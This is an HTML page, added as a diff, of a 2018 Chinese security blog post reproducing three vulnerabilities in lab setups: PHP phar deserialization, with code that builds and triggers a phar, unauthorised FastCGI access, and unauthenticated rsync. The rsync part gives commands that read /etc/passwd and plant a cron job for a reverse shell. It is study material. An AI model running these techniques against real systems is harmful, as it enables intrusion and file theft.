@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          phar &amp; fastcgi &amp; rsync 漏洞小结 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/10/phar-fastcgi-rsync-漏洞小结/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>phar &amp; fastcgi &amp; rsync 漏洞小结</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-10-14
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>几个简单复现了下的漏洞类型，但是又我之前没学过的。</p>
+<p>总是喜欢记录一下，但是又不想分开三篇来记录，就合到了一篇里面。</p>
+<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p>前段时间black hat会议上新提出的一种攻击手法（但orange师傅2017年就用这个在hitcon出过题）</p>
+<p>主要是利用<code>phar://</code>协议在解析数据的时候，会触发一次<code>unserialize</code>，从而产生反序列化</p>
+<h2 id="phar文件格式"><a href="#phar文件格式" class="headerlink" title="phar文件格式"></a>phar文件格式</h2><p>文件格式里有那么几个比较重要的参数</p>
+<h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>为一个phar的标志，格式为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="meta">&lt;?php</span> xxx; <span class="comment"><span class="keyword">__HALT_COMPILER</span>();?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>后面必须以<code>__HALT_COMPILER();?&gt;</code>结尾，否则无法识别</p>
+<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>会以<strong>序列化</strong>形式存储用户自定义的<code>meta-data</code></p>
+<p>也就是这块内容在解析的时候会被反序列化，从而产生反序列化漏洞</p>
+<h3 id="file-contens"><a href="#file-contens" class="headerlink" title="file contens"></a>file contens</h3><p>被压缩的文件内容</p>
+<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>文件签名</p>
+<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>首先测试生成一个<code>phar</code>文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>主要要设置的就三个值</p>
+<ul>
+<li><code>setStub</code>： 一般为固定值 <code>&lt;?php __HALT_COMPILER(); ?&gt;</code>或者也可以添加一些自定义文件头之类的</li>
+<li><code>setMetadata</code>：需要反序列化的类</li>
+<li><code>addFormString</code>：文件名和文件内容可以随意填，这里文件名（这里为<code>test.txt</code>到后续需要使用</li>
+</ul>
+<p>重命名为<code>1.jpg</code>，然后尝试触发</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="string">'phar://1.jpg/test.txt'</span>;</span><br><span class="line">    file_exists($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/2.png" alt></p>
+<p><code>test.txt</code>就是之前的文件名，成功反序列化</p>
+<p>而且可以触发的函数也比较多</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/(phar-fastcgi-rsync-漏洞小结/1.png" alt></p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>需要注意的就是，文件存在的时候需要先删掉才能重建</p>
+<p>文件后缀必须为<code>.phar</code>，但是生成好之后可以改</p>
+<p>这样，无疑极大的拓展了反序列化的攻击面，无需强制使用<code>unserialize</code>。只要能完全控制文件名，甚至文件名的前面一部分，就可以触发反序列化。感觉触发的场景无疑多了许多，主要任务就是寻找pop chain了。</p>
+<h1 id="Fast-cgi未授权访问"><a href="#Fast-cgi未授权访问" class="headerlink" title="Fast-cgi未授权访问"></a>Fast-cgi未授权访问</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Fastcgi是一种跟高效的php与webserver之间通信的协议。</p>
+<p>PHP-FPM是一个fastcgi协议解析器，webserver将用户请求按照fastcgi的规则打包好后传给FPM。</p>
+<p>当fastcgi端口（默认为9000）暴露在公网中时，就可以伪造fastcgi协议通信内容，从而执行php</p>
+<p>当端口没有暴露的时候，也是可以通过SSRF进行攻击的</p>
+<p>具体原理和分析可以看<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>漏洞环境用p神的vulhub</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/fpm" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fpm</a></p>
+<p>脚本</p>
+<p><a href="https://github.com/kingkaki/Exploit-scripts/blob/master/fast-cgi/fpm.py" target="_blank" rel="noopener">https://github.com/kingkaki/Exploit-scripts/blob/master/fast-cgi/fpm.py</a></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/3.png" alt></p>
+<h1 id="rsync-未授权访问漏洞"><a href="#rsync-未授权访问漏洞" class="headerlink" title="rsync 未授权访问漏洞"></a>rsync 未授权访问漏洞</h1><blockquote>
+<p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p>
+</blockquote>
+<p>在没有设置密码的时候，就可以任意文件读取和写入，在内网渗透的时候用处较大</p>
+<p>可以通过访问<code>/src</code>目录看到备份了的文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync:<span class="regexp">//</span>localhost:<span class="number">873</span><span class="regexp">/src/</span></span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">rsync</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">::src</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/4.png" alt></p>
+<p>任意文件下载</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av  rsync:<span class="regexp">//</span>localhost:<span class="number">873</span><span class="regexp">/src/</span>etc<span class="regexp">/passwd ./</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/5.png" alt></p>
+<p>还可以写入文件，例如写一个定时任务，反弹shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av shell rsync:<span class="regexp">//</span>localhost:<span class="number">873</span><span class="regexp">/src/</span>etc<span class="regexp">/cron.d/</span>shell</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phar-fastcgi-rsync-漏洞小结/6.png" alt></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+<p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/10/Thinkphp-聚合查询漏洞/" data-toggle="tooltip" data-placement="top" title="ThinkPHP 聚合查询漏洞">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/10/护网杯-web/" data-toggle="tooltip" data-placement="top" title="护网杯-web">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
